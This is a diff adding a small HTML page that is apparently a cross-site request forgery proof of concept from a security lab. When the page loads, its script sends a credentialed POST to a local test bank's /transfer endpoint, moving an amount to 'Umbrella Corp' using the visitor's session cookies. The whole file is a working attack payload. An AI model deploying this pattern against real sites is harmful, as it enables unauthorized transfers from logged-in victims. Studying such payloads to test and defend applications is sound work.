@@ -1,0 +1,26 @@
+<html>
+
+	<head></head>
+
+	<body>
+
+
+		<script>
+			
+			var body = "recipient=Umbrella+Corp&amount=666";
+
+			fetch("http://bank.127.0.0.1.xip.io:8080/transfer", {
+				method: "POST",
+				headers: {
+					'Content-Length': body.length,
+					'Content-Type': 'application/x-www-form-urlencoded'
+				},
+				credentials: 'include',
+				body: body
+			});
+
+		</script>
+	</body>
+
+
+</html>
